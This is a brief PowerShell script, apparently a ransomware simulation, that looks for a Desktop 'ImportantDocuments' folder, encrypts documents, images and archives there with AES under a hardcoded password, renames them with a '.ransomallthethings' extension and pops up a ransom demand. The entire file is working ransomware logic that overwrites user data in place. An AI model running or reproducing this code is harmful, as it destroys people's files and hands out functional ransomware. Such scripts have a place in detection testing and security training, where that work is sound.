$Folder = $HOME + '/Desktop/ImportantDocuments/'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
  $aes = new-object System.Security.Cryptography.AesCryptoServiceProvider; 
  $aes.KeySize = 128; 
  $aes.Mode = 4; 
  $aes_crypt = $aes.CreateEncryptor([System.Security.Cryptography.Rfc2898DeriveBytes]::new("RansomAllTheThings!",@([byte]1,2,3,4,5,6,7,8)).GetBytes(16), @([byte]16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1)); 
  $Folder | ForEach-Object {    Get-ChildItem -Path $(Join-Path $env:USERPROFILE $_) -Include "*.txt","*.doc","*.docx","*.pdf","*.jpg","*.gif","*.png","*.xls","*.xlsx","*.zip","*.ppt","*.pptx" -Recurse | Where { $_.Length -le "200mb" } | ForEach-Object {       $c = [System.IO.File]::ReadAllBytes($_.FullName);       $cs = [System.Security.Cryptography.CryptoStream]::new($_.OpenWrite(), $aes_crypt, [System.Security.Cryptography.CryptoStreamMode]::Write);       $cs.Write($c, 0, $c.Length);       $cs.Close();       $_.MoveTo($_.FullName + ".ransomallthethings");    }} 
  Add-Type -AssemblyName PresentationCore,PresentationFramework 
  $msgBody = "All of your important documents have been encrypted. Pay the ransom... or else!!!" 
  [System.Windows.MessageBox]::Show($msgBody)
  "Path exists!"
} else {
    dir;
    "Path doesn't exist."
}
